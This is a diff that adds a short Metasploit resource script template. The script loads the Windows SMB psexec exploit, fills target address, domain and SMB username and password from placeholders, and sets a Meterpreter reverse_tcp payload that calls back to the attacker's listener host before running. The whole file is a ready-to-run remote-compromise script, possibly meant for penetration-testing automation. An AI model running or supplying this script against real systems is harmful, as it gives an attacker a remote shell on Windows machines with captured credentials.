@@ -1,0 +1,9 @@
+use exploit/windows/smb/psexec
+set RHOSTS %%TARGET_IP%%
+set RPORT %%TARGET_PORT%%
+set SMBDomain %%DOMAIN%%
+set SMBUser %%SMB_USER%%
+set SMBPass %%SMB_PASS%%
+set LHOST %%LHOST%%
+set PAYLOAD windows/meterpreter/reverse_tcp
+run
